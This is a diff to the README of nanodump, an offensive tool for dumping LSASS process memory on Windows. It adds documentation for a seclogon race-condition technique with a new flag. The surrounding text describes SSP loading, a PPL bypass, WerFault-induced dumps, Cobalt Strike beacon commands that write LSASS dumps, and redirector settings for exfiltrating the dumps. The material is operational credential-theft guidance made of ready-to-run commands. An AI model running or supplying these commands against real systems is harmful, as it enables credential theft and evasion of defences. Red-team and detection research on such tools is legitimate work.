@@ -14,6 +14,7 @@ A flexible tool that creates a minidump of the LSASS process.
   <li><a href="#handledup">Handle duplication</a></li>
   <li><a href="#malseclogon">MalSecLogon</a></li>
   <li><a href="#malseclogon-and-duplicate">MalSecLogon and handle duplication</a></li>
+  <li><a href="#malseclogon-race-condition">MalSecLogon race condition</a></li>
   <li><a href="#ssp">Load nanodump as an SSP</a></li>
   <li><a href="#ppl">PPL bypass</a></li>
   <li><a href="#wer">WerFault</a></li>
@@ -127,7 +128,12 @@ As said before, using MalSecLogon requires a nanodump binary to be written to di
 This can be avoided if `--malseclogon` and `--dup` are used together with `--binary`.  
 The trick is to leak a handle to LSASS using MalSecLogon, but instead of leaking it into nanodump.exe, leak it into another binary and then duplicate the leaked handle so that nanodump can used it.
 
-<h2 id="ssp">8. Load nanodump as an SSP</h2>
+<h2 id="malseclogon-race-condition">8. MalSecLogon race condition</h2>
+
+You can trick the seclogon process to open a handle to LSASS and duplicate it before it is closed, by winning a race condition using file locks.
+Use the `--malseclogon-race` flag to access this functionality.
+
+<h2 id="ssp">9. Load nanodump as an SSP</h2>
 
 You can load nanodump as an SSP in LSASS to avoid opening a handle. The dump will be written to disk with an invalid signature at `C:\Windows\Temp\report.docx` by default. Once the dump is completed, `DllMain` will return FALSE to make LSASS unload the nanodump DLL.  
 To change the dump path and signature configuration, modify the function `NanoDump` in [entry.c](source/entry.c) and recompile.  
@@ -152,7 +158,7 @@ beacon> load_ssp \\10.10.10.10\openShare\ssp.dll
 ```
 
 
-<h2 id="ppl">9. PPL bypass</h2>
+<h2 id="ppl">10. PPL bypass</h2>
 If LSASS is running as Protected Process Light (PPL), you can try to bypass it using a userland exploit discovered by Project Zero. If it is successful, the dump will be written to disk.  
 
 To access this feature, use the `nanodump_ppl` command
@@ -160,7 +166,7 @@ To access this feature, use the `nanodump_ppl` command
 beacon> nanodump_ppl -v -w C:\Windows\Temp\lsass.dmp
 ```
 
-<h2 id="wer">10. WerFault</h2>
+<h2 id="wer">11. WerFault</h2>
 You can force the WerFault.exe process to create a full memory dump of LSASS. Take into consideration that this requires to write to the registry
 
 Because the dump is not made by nanodump, it will always have a valid signature.
@@ -182,7 +188,7 @@ Mode                 LastWriteTime         Length Name
 -a----         6/23/2022   7:40 AM        7862825 nanodump.x64.exe-(PID-3224).dmp
 ```
 
-<h2 id="params">11. Parameters</h2>
+<h2 id="params">12. Parameters</h2>
 
 #### --getpid
 Get PID of LSASS and leave.  
@@ -215,10 +221,13 @@ Leak a handle to LSASS using MalSecLogon.
 Path to a binary such as `C:\Windows\notepad.exe`.  
 This option is used exclusively with `--malseclogon` and `--dup`. 
 
+#### --malseclogon-race -mr
+Force seclogon to open a handle to LSASS and duplicate it.  
+
 #### --werfault -wf < folder >
 Path to the folder where the WerFault process will create an LSASS dump.  
 
-<h2 id="examples">12. Examples</h2>
+<h2 id="examples">13. Examples</h2>
 
 Read LSASS indirectly by creating a fork and write the dump to disk with an invalid signature:
 ```
@@ -266,12 +275,17 @@ Dump LSASS bypassing PPL, duplicating the handle that csrss.exe has on LSASS:
 beacon> nanodump_ppl --dup --write C:\Windows\Temp\lsass.dmp
 ```
 
+Trick seclogon to open a handle to LSASS and duplicate it, then download the dump with an invalid signature:
+```
+beacon> nanodump --malseclogon-race
+```
+
 Make the WerFault.exe process create a full memory dump in the Temp folder:
 ```
 beacon> nanodump --werfault C:\Windows\Temp\
 ```
 
-<h2 id="redirectors">13. HTTPS redirectors</h2>
+<h2 id="redirectors">14. HTTPS redirectors</h2>
 
 If you are using an HTTPS redirector (as you should), you might run into issues when downloading the dump filessly due to the size of the requests that leak the dump.  
 Increase the max size of requests on your web server to allow nanodump to download the dump.
@@ -295,7 +309,7 @@ location ~ ^...$ {
 - [freefirex](https://twitter.com/freefirex2) from [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF) at Trustedsec for many cool tricks for BOFs
 - [Jackson_T](https://twitter.com/Jackson_T) for [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2)
 - [BillDemirkapi](https://twitter.com/BillDemirkapi) for [Process Forking](https://billdemirkapi.me/abusing-windows-implementation-of-fork-for-stealthy-memory-operations/)
-- [Antonio Cocomazzi](https://twitter.com/splinter_code) for [MalSecLogon](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html)
+- [Antonio Cocomazzi](https://twitter.com/splinter_code) for [Abusing leaked handles to dump LSASS memory](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html) and [Racing for LSASS dumps](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html)
 - [xpn](https://twitter.com/_xpn_) for [Exploring Mimikatz - Part 2 - SSP](https://blog.xpnsec.com/exploring-mimikatz-part-2/)
 - [Matteo Malvica](https://twitter.com/matteomalvica) for [Evading WinDefender ATP credential-theft: a hit after a hit-and-miss start](https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/)
 - [James Forshaw](https://twitter.com/tiraniddo) for [Windows Exploitation Tricks: Exploiting Arbitrary Object Directory Creation for Local Elevation of Privilege](https://googleprojectzero.blogspot.com/2018/08/windows-exploitation-tricks-exploiting.html)
